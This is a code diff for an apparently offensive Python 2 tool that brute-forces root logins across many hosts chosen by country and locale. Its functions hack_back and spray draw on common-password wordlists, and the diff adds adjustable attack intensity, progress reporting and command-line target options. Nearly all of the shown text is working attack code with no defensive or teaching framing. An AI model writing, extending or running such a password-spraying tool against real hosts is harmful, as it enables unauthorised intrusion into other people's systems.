@@ -119,32 +119,41 @@ def attempt(ip,uname,passwd):
     return connected, win
 
 
-def hack_back(ip, determined):
+def hack_back(ip, determination):
     p = multiprocessing.Pool(processes=4)
     success = {}
-    names = ['root', 'user']  # 'admin',
+    names = ['root']    # 'user','sys', 'admin',
     start = time.time()
     connected = False
     common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
     additional_words = list(set(swap('common_passwords.txt', False)))
-    if determined:
-        for entry in additional_words:
+    random.shuffle(additional_words)
+    if not determination[0]:
+        for entry in additional_words[0:determination[1]]:
             common.append(entry)   # random.shuffle(common
+        print '... Throwing %d words at %s' % (len(common),ip)
     else:
-        random.shuffle(additional_words)
-        for word in additional_words[0:100]:
+        more_words = list(set(swap('common_passwords.txt', False)))
+        random.shuffle(more_words)
+        for word in more_words:
             common.append(word)
-    print '... Bruteforcing %s' % ip
+        print '... Bruteforcing %s' % ip
+    N = len(names)*len(common)
+    attempts = 0
     for u in names:
         for pw in common:
             try:
                 event = p.apply_async(func=attempt, args=(ip, u, pw))
                 connected, success = event.get(timeout=120)
+                attempts += 1
             except multiprocessing.TimeoutError:
                 connected = False; success = ''
                 pass
             if connected:
                 break
+        if attempts>0 and attempts%75==0:
+            print '\033[1m[#] No luck after \033[31m%d/%d\033[0m attempts\033[1m\033[0m' % \
+                  (attempts, N)
         if connected:
             break
     if not connected:
@@ -212,7 +221,7 @@ def spray(ip_locations, locale, country_codes, intense):
     tic = time.time()
     pwn_count = 0
     print 'STARTING ATTACK [%d Hosts]' % len(targets)
-    if intense:
+    if intense[0]:
         print '[*] Using Brute Force '
     # Scan Open Ports
     for address in targets:
@@ -242,10 +251,11 @@ if __name__ == '__main__':
         brute_force = False
 
     if 'target' in sys.argv and ('-i' or '!!') in sys.argv:
-        spray(ip_loc, sys.argv[2], c_codes, True)
-    elif 'target' in sys.argv:
-        spray(ip_loc, sys.argv[2], c_codes, False)
-
+        spray(ip_loc, sys.argv[2], c_codes, [True, 1500])
+    elif 'target' in sys.argv and len(sys.argv) < 4:
+        spray(ip_loc, sys.argv[2], c_codes, [False, 50])
+    elif 'target' in sys.argv and '-n' and len(sys.argv) >=5:
+        spray(ip_loc, sys.argv[2], c_codes, [False, int(sys.argv[4])])
 
     if 'test' in sys.argv:
         blunt_force_attack('10.0.0.5', True)
